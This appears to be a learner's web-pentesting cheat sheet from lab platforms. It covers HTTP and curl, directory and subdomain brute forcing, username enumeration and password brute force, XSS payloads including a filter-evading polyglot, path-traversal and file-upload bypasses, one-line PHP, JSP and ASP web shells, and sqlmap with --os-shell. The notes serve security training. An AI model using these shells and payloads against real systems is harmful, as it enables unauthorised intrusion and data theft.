# HTTP

status codes: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes OR https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods

`--script http-enum`

Request Line (above headers): `METHOD /path HTTP/version`

HTTP Methods
- GET
- POST
- PUT
- DELETE
- PATCH
- HEAD
- OPTIONS (see options for that server)
- TRACE
- CONNECT

Request Headers:
- Host: web server the request is for
- User-Agent: web browser submitting the request
- Referer: URL which the request came from
- Cookie value
- Content-Type

Response Headers
- Content-Type
- Content-Length
- Date
- Server
- Set-Cookie
- Cache-Control
- Location (used in 3xx redirection responses)

Security Headers
- CSP Content-Security-Policy, protects against XSS and allows admins to say what domains or sources are considered safe to interact with. Has options such as `default-src` or `script-src`
- HSTS Strict-Transport-Security, ensures that browsers only try to connect with HTTPS
- X-Content-Type-Options, instructs browser to do things like not guess the MIME type.
- Referrer-Policy, controls information sent to the destination web server when a user is redirected from the source web server. Allows admin to control what information is shared. `Referrer-Policy`

URL components
- scheme (HTTP(S))
- host/domain
- port (sometimes)
- path to a file or page
- Query String (`?id=1`), for search terms or form inputs
- Fragment (`#task3`), points to a specific section of a web page

HTTP Response Codes
- 1xx informational
- 2xx successful request
- 3xx redirection messages
- 4xx client error response (404 not found)
- 5xx server error response

cURL
- `curl -IL [IP]` returns server info and content-type
- `-I` send ‘head’ request only
- `-i` send request for both headers and response
- `-H` manipulate request headers -H Content-Type: application/json
	- `-A` user-agent header
- `-X` change request method (GET, POST, etc)
- `-d` add data to request -d ‘username=admin&password=admin’
- `-b` set cookie -b PHPSESSID=value
- Example: `curl -X POST -d '{"search":"flag"}' -b 'PHPSESSID=7oor8tk915omp3g42qhpk9t92e' -H 'Content-Type: application/json' -i -v http://94.237.54.42:42686/search.php`
	- POST method to the page
	- Data was in JSON format (this is the search feature on the page)
	- Cookie set with -b 
	- Content-type set for JSON
	- To get the PHPSESSID for this request, you can make the POST data (-d) the login info, -X POST -d ‘username=admin&password=admin’ -i -v and see the header with the cookie value
- Enumerating API info - (google CRUD or REST api’s to see how request methods work with these)
	- We want to see how the database information is stored. In the “search cities” application from above, use this `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq` to see all of the “city” entries. Piping to `jq` will give you the proper JSON formatting.
	- To update the database now that we know the formatting: `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
	- If we wanted to use `-X PUT` to update a database entry, we would need to specify the entry in the URL (to update “london” use `/api.php/city/london`)


#### Windows IIS (Internet Information Service)

- WebDav is one implementation of an IIS http server
- if you find a /webdav/ directory on the http server, you know it's running WebDav
	- `davtest -url [url]` will test the server
	- `-auth user:pass` if you have credentials
	- Once you can see what file types are allowed, build a webshell in one of those formats.
	- `cavader -url [url]` to interact with WebDav server and upload shell
	- `put [webshell]`
	- Use browser to execute

If you see a `.cgi` page or script on the server, sheck for the `http-shellshock` vulnerability (nmap script)

# Automated Discovery

Dirsearch
- `-u` host
- `-w` wordlist
- `-r` recursive
- `-R` recursive depth

FFUF
- 

Gobuster (most of these options apply to `dir` mode)
- `-u` host
- `-t` threads (64 threads is a good option)
- `-w` wordlist
- `--debug` troubleshoot errors
- `-o` writes to output file
- `-c` (cookies, session ID)
- `-x` file extensions
- `-h` pass certain HTTP headers with a request
- `-U` username, `-P` password
- `-s` whitelist HTTP code
- `-b` blacklist HTTP code
- mode:
	- `dir`
	- `dns` (subdomain enum)
		- `-i` show ip address of enumerated subdomains
		- `-d` domain (instead of `-u`)
	- `vhost`
		- `-u` URL with IP address instead of domain (otherwise you get false positives, you only want to return hits attached to that IP address)
		- `--append-domain`
	- `fuzz` 
# Common Vulnerabilities
## Authentication Bypass


Username Enumeration
- enter a username and fill out other fields with fake info to see if "that username already exists" is returned
- `ffuf -w [wordlist] -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -mr "username already exists"`
	- `x` specifies request method
	- `d` specifies data that we send, such as username, email, and password
	- `H` is for adding additional headers
	- `mr` is text on the page that we're looking for

Brute Force Password
- use a .txt file of enumerated usernames
- `-ffuf -w valid_usernames.txt:W1,[wordlist for passwords]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -fc 200`
-  https://github.com/digininja/CeWL - Custom wordlist based on website pages

Logic Flaw
- try different capitalizations if something like an /admin page is not allowed (try /aDMin). This is because the code might be searching for a specific string, but the URL will change the capitalization

Cookies
- sometimes cookies are in plain text and can be altered (set-cookie: admin=false)
- `curl -H "Cookie: logged_in=true; admin=true" [URL]` to edit a url request

## XSS

Proof of Concept: trigger an alert to prove XSS

Session Stealing: taking a target's cookie, login token, etc.

**Reflected XSS**: user-supplied data in an HTTP request is included in the webpage source without any validation.
To test for reflected:
- look for parameters in the URL Query String
- look in the URL file path
- HTTP Headers

**Stored XSS**: payload is stored on the web application and then gets run when other users visit the site or web page.
Look here to insert the payload:
- comments on a blog
- user profile information
- website listings
- any place that takes user input and saves it for later

**DOM-Based XSS**: javascript execution happens directly in the browser without new pages being loaded. Execution occurs when the code acts on input or user interaction.

**Payload Examples**
- `<script>alert('THM');</script>`, a script tag with an alert function.
- Escape an input value tag (input is trapped in a `<input>` tag): `><script>alert('THM');</script>`
- Escape a `<textarea>` tag: - `</textarea><script>alert('THM');</script>`
- Escape a script tag: `';alert('THM');//`
- Escape input sanitation: `<sscriptcript>alert('THM');</sscriptcript>`
- Polyglot can escape many filters: ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

## SSRF

Attacker tricks the server into making an additional request other than the one being made to access the webpage.

Search for opportunities:
- URL's that have another URL in their parameter
- Hidden field form in the source code that references a URL
- Partial URL such as just a hostname
- Path of a URL after the domain name `=/forms/contact`


## Server Side Template Injection (SSTI)

Attacker injects malicious input into a template in order to execute commands on the server

Template Engine: display dynamically generated content on a web page. They replace variables inside a template file with actual values and display the values to the client.

Search for common SSTI payloads (graph below)
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## File Inclusion

Path Traversal
- vulnerability that allows attacker to read system resources
- Try something like `/get.php?file=../../` etc.
- or `/?file=../../../` etc

File Inclusion
- When web apps are designed to pull files from directories, we may be able to exploit this
- try `?file=`
- if input is sanitizing `../` try `....//....//` because it won't do a second pass
- if it requires the intended directory to be in the payload, simply start there `/profile` and add the `../`

Remote File Inclusion
- payloads have external endpoints
- inject malicious files by connecting to a server hosted by the attacker
- URL injection `http://webapp.thm/index.php?lang=[malicious URL]`
- give it the URL of your python server or something


## File Upload

Filter types:
- Client side (javascript)
- Server side (application, firewall filter)

Client-Side
-  turn off javascript in your browser
- intercept with burp and edit js scripts
	- `if (file.type!= "image/jpeg) {upload.value = ""}` or something
	- Intercept the request and then right-click to select "response to this request"
	- Break the HTML script tag
	- For external js scripts that the page loads, use "options" in burp, "intercept client request", `^js$|`
- intercept and modify the file upload
	- change payload extension to allowed file type
	- change MIME type in request to `text/x-php` or whatever
	- edit back to actual payload file type before forwarding
	- Intercept an innocent file upload to enumerate what is going on

Server-side
- Magic numbers
	- [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
	- `file` checks file type of shell
	- find bytes for permissible filte type, open file and add them to the top (above code)
	- reopen file with `hexeditor` and change the bytes
	- use `file` again to double check

Upload to file shares and directories

Find a file through enumerating and overwrite it with a payload that has the same name

Blackbox environment
- upload a test file and try to see where it goes
- use `gobuster -x` to try and find file
- look at source code
- intercept requests
- if server-side filter:
	- upload file with invalid (made up) file extensions to check for white list/black list
		- if upload is successful, blacklist
		- if upload fails, whitelist


# Web Shells

`/usr/share/webshells/[file_type]/[shell]`
`/usr/share/laudanum` 
review `aspx` shells if you need to

php
	`<?php system($_REQUEST["cmd"]); ?>`

jsp
	`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

asp
	`<% eval request("cmd") %>`
	if you see something like `aspnet_client` in an FTP server, it could be vulnerable to an aspx shell

Extensive Functionality Web Shells:
- https://github.com/flozz/p0wny-shell
- https://github.com/b374k/b374k
- https://www.r57shell.net/single.php?id=13

# SQL

MySQL MSF modules
- Mysql_enum
- Mysql_login
- Mysql_file_enum
- Mysql_hashdump
- Mysql_schemadump

### Basics
- [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/) common log in options
- all queries end with `;`
- enum db and tables commands
	- `SHOW DATABASES`
	- `USE [database]`
	- `DROP database [database]` to exit
	- `SHOW TABLES;` (after selecting a database)
	- `DESCRIBE [table_name]`
- enum table entries
	- `SELECT [value] FROM [table_name];`
	- `SELECT * FROM [table] WHERE [column]=[value] OR [column]=[value]`
		- `[value]` may need quotation marks if it's a string
	- `UNION SELECT` for selecting from multiple tables
		- `SELECT [column],[column], FROM [table] UNION SELECT [column] FROM [table]`
	- `LIKE` to use after `WHERE`
		- `WHERE [column] LIKE 'East%'`
		- `%` is a wildcard at the end
	- `SELECT DISTINCT [column] from [table]`
		- This will show you all of the different values a column has in a table. For example, if you have a table of books and one of the columns is genre, this will return all the different genre values that are present
	- `ORDER BY [column]`
	- `BETWEEN` is like `SELECT * FROM * WHERE os_patch_date BETWEEN ['date'] AND ['date']`
- times in sql are written as `18:00`
- comparison operators: `>, <, =, <=, >=, != (not equal to)`

### SQLmap
- `sqlmap`
	- `-r` request file
	- `--dbs` enumerate database
	- `-D [database] --tables` enumerate tables in a db
	- `-D [database] -T [table] --dump` dumb a table contents
	- `--wizard` guides you through options
	-  `--cookie=PHPSESSID=[cookie value]` if you are logged into an admin account or something. If you exported a .txt file with burp, sqlmap will read the session ID from that file
	- `--os-shell` to try and get command execution
- Troubleshooting 
	- if it's a search function, execute a search to see the specific URL you need. And then replace `search=any+query` as the search value 
	- if the URL doesn't show the query string, use the `network` tab of the browser inspector and resubmit the form, you should see the query string there
	- `http://10.10.232.214/ai/login` became:
	- `http://10.10.232.214/ai/includes/user_login?email=joe@joe&password=hello`


